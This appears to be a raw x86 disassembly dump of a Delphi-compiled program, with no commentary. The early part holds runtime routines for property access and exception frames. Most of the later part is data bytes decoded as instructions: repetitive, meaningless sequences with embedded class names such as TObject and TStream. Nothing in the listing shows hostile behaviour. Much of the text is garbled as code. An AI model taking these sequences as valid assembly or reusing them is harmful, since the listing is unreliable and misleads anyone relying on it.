mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_414e50
cmp [ eax ] 0x4
jne r-xdata
sub_415720
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_414e50
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_415768 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_415897 ]
jmp [ eax * 4 + jump_table_415804 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_41592c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415918
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_41596c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415918
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4159ac
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4159ec
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415a24
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_415a4c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_415a88
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_405ad0
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415b08
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_405ad0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_415b7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415bc2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415bc9
retn
mov eax rw-data
call sub_404118
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404bb4
sub_415bf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415c19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c20
retn
sub_41653d
sbb [ ebp + 0x41 ] esp
add [ edi ] ah
inc ecx
add [ ecx ] dh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
cmp eax 0x8004165
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x65b80040 ] cl
inc ecx
add [ ecx + 0x65 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add al cl
inc ecx
add ah dh
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
jl r-xdata
jb r-xdata
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x5c004194 ] bl
xor eax 0x35600040
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al cl
xchg edx eax
inc ecx
add al bl
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax ] ch
xchg ebp eax
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + edx ] ah
inc eax
add [ eax + eax ] al
add [ eax ] al
adc eax 0x746e4954
jb r-xdata
add al dl
xor al [ eax ]
test [ esi - 0x6c27ffbf ] dl
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
jl r-xdata
popad
arpl [ ebp + 0x64 ] sp
push eax
jb r-xdata
imul esi [ ebx + 0x74 ] 0xb8746e65
inc ecx
add al dh
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
inc ecx
add [ edi ] al
andps xmm0 [ ebx + 0x6f ]
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec ecx
je r-xdata
inc ecx
add al ah
xchg ebx eax
inc ecx
add ah dh
xchg edx eax
inc ecx
add al dh
xchg esi eax
inc ecx
add al dl
xchg edi eax
inc ecx
add [ eax ] al
cwde
inc ecx
add al bh
xchg edi eax
inc ecx
add [ esi + edx * 4 + 0x41 ] cl
add [ edx ] al
add bh bh
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esi + edx * 4 - 0x6c27ffbf ] al
xor eax 0x32b40040
inc eax
imul esi [ ebx + 0x74 ] 0xf4746e65
inc ecx
add [ edi ] al
adc eax 0x746e4954
jae r-xdata
xchg ebx eax
inc ecx
add al ah
xchg ebx eax
inc ecx
add al ch
cwde
inc ecx
add [ ebp + ebx * 4 + 0x41 ] dl
add [ eax - 0x63 ] bl
inc ecx
add [ ebp + ebx * 4 + 0x41 ] bl
add [ eax ] dl
popfd
inc ecx
add [ ebx * 4 - 0x667fffbf ] dl
inc ecx
add ah bh
cdq
inc ecx
insd
insb
inc cx
add al dh
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x66
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x669a0041 ] cl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] dl
add [ eax ] al
add al 0x0
std
sbb [ ecx - 0x6603ffbf ] 0x41
jae r-xdata
add [ ebp + 0x67240040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x41 ] cl
add [ eax + 0x4167 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x67 ] bl
inc ecx
add [ eax + 0x67 ] bh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + 0x41 ] bh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + ebx * 4 + 0x41 ] bh
add al bl
sub_4169b0
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
or [ eax - 0x60ffffbf ] ah
outsb
dec ecx
je r-xdata
add al dl
xor al [ eax ]
or al 0x33
imul ebp [ esi + 0x67 ] 0x7473694c
les ebp [ edx + 0x41 ]
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
inc ecx
add [ eax - 0x4f ] cl
inc ecx
add [ ecx + esi * 4 + 0x41 ] bh
add [ eax - 0x7bffbe4f ] al
mov cl 0x41
add [ ebp + 0x41 ] ah
add al bh
mov dl 0x41
add [ ebx + esi * 4 + 0x41 ] dl
add [ eax ] ch
mov ah 0x41
add [ eax + 0x640041ac ] dh
mov ah 0x41
add al bl
mov ah 0x41
add ah bh
scasb [ edi ]
inc ecx
add [ eax ] cl
scasd [ edi ]
inc ecx
add [ eax - 0x62 ] cl
inc ecx
add [ edi + ebp * 4 - 0x501bffbf ] ah
inc ecx
add [ eax - 0x50 ] dl
inc ecx
add [ eax ] dl
movsd [ edi ] [ esi ]
inc ecx
add al ah
mov cl 0x41
add [ edi - 0x5787ffbf ] ah
inc ecx
add [ edx + esi * 4 ] bl
inc ecx
add [ edx + esi * 4 ] ch
inc ecx
add ah bl
test al 0x41
add [ eax ] dh
test eax 0xa9dc0041
inc ecx
add [ ebx + ebp * 4 + 0x41 ] dh
add ah cl
stosd [ edi ]
inc ecx
add [ eax - 0x54 ] ah
inc ecx
add [ edi + ebp * 4 + 0x41 ] ch
add [ eax - 0x7fffbe51 ] cl
mov dl 0x41
add al dl
mov al 0x41
add [ eax - 0x5fffbe4c ] dl
mov ah 0x41
add [ ebx ] cl
push esp
push ebx
je r-xdata
mov al [ 0xffffffff9f000041 ]
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
sbb al 0x6a
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
push 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 + 0x300041 ] dh
add [ eax ] al
mov al [ 0x4c004168 ]
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffbe52 ] ah
xchg ebx eax
inc ecx
add [ eax ] cl
add [ eax ] ch
mov ch 0x41
add al dl
mov ecx 0xb9e40041
inc ecx
add [ ecx + edi * 4 - 0x466bffbf ] al
popad
add [ ebp + esi * 4 + 0x2aec0041 ] cl
inc eax
add ah ch
sub al [ eax ]
sub al 0xb6
inc ecx
add [ eax + 0x70041b6 ] dh
push esp
push ebx
je r-xdata
sub [ ebp - 0x4a8bffbf ] dh
inc ecx
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov [ ecx + 0x41 ] ch
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
inc eax
insb
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x41 ] bl
add [ eax ] cl
add [ eax ] al
add [ ebx + ebp * 2 + 0x41 ] bh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + edi * 4 - 0x4ad7ffbf ] ah
inc ecx
add al dl
mov ecx 0xb9e40041
inc ecx
add [ ecx + edi * 4 - 0x466bffbf ] al
inc ecx
add [ esi + esi * 4 ] ch
inc ecx
add [ ecx + edi * 4 + 0x540b0041 ] ah
inc esi
imul ebp [ ebp + 0x53 ] 0x61657274
inc ecx
add [ esi + esi * 4 ] ch
inc ecx
add [ ecx + edi * 4 + 0x540d0041 ] ah
dec eax
popad
test [ ecx - 0x466bffbf ] bh
popad
insd
xor al 0x6b
inc ecx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
jb r-xdata
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
insd
mov ah 0x6c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
insb
inc ecx
add [ eax ] dl
add [ eax ] al
add al ch
push 0x41
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] dh
add [ ebp + esi * 4 - 0x441fffbf ] cl
inc ecx
add ah ch
sub al [ eax ]
sbb [ ecx + eax * 2 + 0x41b6b000 ] bh
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
mov al 0xb6
je r-xdata
outsb
insb
push ebx
je r-xdata
jae r-xdata
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
insd
pop esp
imul eax [ ecx ] 0x7
pop es
push esp
push ebx
je r-xdata
popad
inc eax
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] dh
add [ ebp + 0x6b340040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6b ] dl
inc ecx
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
jns r-xdata
push ebx
je r-xdata
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
xor al 0x6e
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6e ] dl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax + 0x6c ] ch
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax + eax * 8 + 0x41 ] cl
add [ eax ] ch
mov ch 0x41
add [ ebp + esi * 4 + 0x41 ] dh
add [ ebp + esi * 4 - 0x441fffbf ] cl
inc ecx
add [ eax + eax * 8 - 0x43e7ffbf ] al
inc ecx
add [ eax + 0xf0041b6 ] dh
push esp
push edx
jae r-xdata
push ebx
dec ebp
inc ecx
add [ eax + 0xc0041b6 ] dh
mov ebp 0x540d0041
add [ ebp + 0x6bc80040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
imul eax [ ecx ] 0x8
add [ eax ] al
add al ch
push 0x41
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
sub [ ebp - 0x4103ffbf ] dh
inc ecx
add [ ebp + esi * 4 - 0x41d3ffbf ] cl
je r-xdata
insd
outsd
jb r-xdata
inc ecx
add [ edi * 4 + 0x540d0041 ] cl
popad
insd
xor [ ebp + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6d ] dl
inc ecx
add [ eax + eax ] dl
add [ eax ] al
push 0x4c00416c
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ esp + edi * 4 ] bh
inc ecx
add [ eax ] ch
mov ch 0x41
add al ah
mov esp 0xb58c0041
inc ecx
add al ah
mov ebx 0xbd980041
inc ecx
add [ eax ] bl
mov esp 0xb6b00041
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
inc ecx
add [ esi + edi * 4 + 0x41 ] ch
add [ esi + edi * 4 - 0x494fffbf ] ah
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
popad
insd
mov eax eax
lodsb [ esi ]
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
insd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
insd
inc ecx
add [ eax + eax ] cl
add [ eax ] al
call 0x4c41aef7
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] ch
mov ch 0x41
add ah bh
mov esi 0xb58c0041
inc ecx
add [ esi + edi * 4 ] ch
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_416f78
push edx
outsd
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
add al 0xc8
inc ecx
add [ eax ] bh
enter 0x41 0x4c

add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x71 ] al
inc ecx
add [ eax + eax ] bh
add [ eax + 0x70 ] bl
inc ecx
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ edi + eax * 8 - 0x3ef3ffbf ] ah
inc ecx
add [ eax + ecx * 8 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi * 2 + 0x280041 ] dh
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
jb r-xdata
outsd
inc ecx
add [ eax ] bl
add [ eax ] al
add [ ecx + edx + 0x354c0040 ] ah
inc eax
add [ eax ] bh
pop ebx
inc eax
add [ ebx + ebx * 2 + 0x40 ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ ebx + ebx * 2 + 0x40 ] dl
add al dl
xor al [ eax ]
mov esp 0xf4004225
and eax 0x265c0042
inc edx
add ah al
inc edx
add [ eax + 0x27 ] cl
inc edx
add [ edi + 0x29ac0042 ] ch
inc edx
add [ eax - 0x3bffbdd7 ] bh
sub [ edx ] eax
shr [ ecx ] 0x1
inc edx
add ah bl
sub [ edx ] eax
pop eax
sub al [ edx ]
push cs
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
dec eax
jo r-xdata
shl [ edx ] 0x1
inc eax
add [ eax + 0xc004180 ] bl
push esp
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x70 ] cl
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx + 0x41 ] dh
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add ah ah
rol [ ecx ] 0xc
rol [ ecx ] 0xec
sub al [ eax ]
in al dx
sub al [ eax ]
in al dx
sub al [ eax ]
push es
push esp
inc esi
imul ebp [ ebp + 0x72 ] 0x41710890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jno r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax + esi * 2 + 0x41 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x70
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
sub_4171a2
inc ecx
add [ eax + esi * 8 + 0x41 ] dh
add [ esp + esi * 8 + 0x41 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2c0040 ] dl
add [ eax ] al
pop es
push esp
push edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
je r-xdata
add al al
dec edi
mov cl 0x6f
inc ecx
add [ eax + eax ] bh
add [ eax ] al
mov al 0x10
inc eax
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x17 ] bh
inc edx
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] dl
pop ss
inc edx
add [ eax + ebx ] ch
inc edx
add ah ch
sub al [ eax ]
pop es
push esp
push esp
push 0x64616572
jl r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
scasd [ edi ]
add [ eax ] al
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
add [ eax ] al
add [ eax ] al
